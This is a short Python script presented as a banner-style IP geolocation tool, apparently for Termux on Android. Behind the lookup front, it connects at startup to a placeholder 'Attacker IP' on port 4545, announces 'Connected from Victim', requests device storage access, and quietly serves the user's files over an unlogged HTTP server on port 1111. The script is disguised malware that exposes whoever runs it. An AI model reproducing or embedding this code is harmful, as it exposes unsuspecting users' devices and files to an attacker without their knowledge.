import http.server
import socketserver
import threading
import _thread
import socket
import requests
import os


def reverse():
        soc = socket.socket()
        ip="Attacker IP"
        port=4545
        soc.connect((ip,port))
        soc.send(bytes("Connected from Victim","utf-8"))
        os.system('termux-setup-storage')
reverse()

def create_server():
        class QuietHandler(http.server.SimpleHTTPRequestHandler):
                def log_message(self, format, *args):
                        pass
        with socketserver.TCPServer(("",1111), QuietHandler) as httpd:
                httpd.serve_forever()


_thread.start_new_thread(create_server,())

def web():
        inp = input("Enter victim IP: ")
        if inp == 'exit':
                print('Bye')
                exit()
        else:
                req =requests.get("https://api.hackertarget.com/geoip/?q="+inp)
                print(req.text)

while True:
        banner="""
     _ _  _        _              _                 
  __| | || |   ___| | _____ _ __ (_)_ __   ___ _ __ 
 / _` | || |_ / __| |/ / __| '_ \| | '_ \ / _ \ '__|
| (_| |__   _| (__|   <\__ \ | | | | |_) |  __/ |   
 \__,_|  |_|  \___|_|\_\___/_| |_|_| .__/ \___|_|   
                                   |_| By Antru             
                                              
         exit For Exit                                    
                                               """
        print(banner)
        web()

         
         
                                                    